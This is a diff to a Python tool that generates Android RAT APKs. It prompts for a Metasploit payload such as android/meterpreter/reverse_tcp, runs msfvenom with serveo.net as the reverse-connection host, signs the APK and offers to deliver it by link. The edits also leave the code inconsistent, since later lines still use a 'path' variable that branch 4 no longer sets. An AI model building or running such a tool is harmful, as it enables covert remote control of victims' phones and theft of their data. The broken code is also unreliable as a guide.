@@ -16,6 +16,8 @@ print("""
                      =====>>> coded by FEBIN REV                                                                                             
      
  """)
+echo="echo -e"
+colour="\033[1m \e[32m programmed by FEBIN"
 os.system('echo -e "\033[1m \e[32m programmed by FEBIN"')
 print("")
 print("""[1]android/meterpreter/reverse_tcp
@@ -29,7 +31,7 @@ print("""[1]android/meterpreter/reverse_tcp
 """)
 payload=click.prompt("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE (default reverse_tcp): ", type=int, default=1)
 output=click.prompt("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[default /root/]: ", type=str, default="/root")
-name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)[default febrev.apk]: ", type=str, default="febrev.apk"  )
+name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)( '.apk' extension is must)[default febrev.apk]: ", type=str, default="febrev.apk"  )
 lhost=click.prompt("ENTER YOUR IP ADDRESS(lhost) : ", type=str, default=socket.gethostbyname(socket.gethostname()))
 lport=click.prompt("ENTER YOUR LISTENER PORT(lport)[default 6595] : ", type=str, default="6595")
 def venom():
@@ -87,14 +89,13 @@ def venom():
     elif payload==4:
         	malware="android/meterpreter/reverse_tcp"
 	        ip=socket.gethostbyname(socket.gethostname())
-	        port=click.prompt("ENTER THE PORT TO FORWARD OVER WAN(the same listener port you entered)[default 6595] : ", type=str, default="6595")
-	        path=input("enter the path to save your payload : ")	
+	        port=lport	
 	        serv=socket.gethostbyname("serveo.net")
 	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
-	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {path}/{name}.apk")
+	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {output}/{name}")
 	        print("SIGNING YOUR APK>>>>>>...")
 	        print("")
-	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {path}/{name}.apk")
+	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {path}/{name}")
 	        print("")
 	        print(f"{path}/{name}.apk  has been created successfully .......")
 	        link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK? (kali linux only) [Y/n] : ")
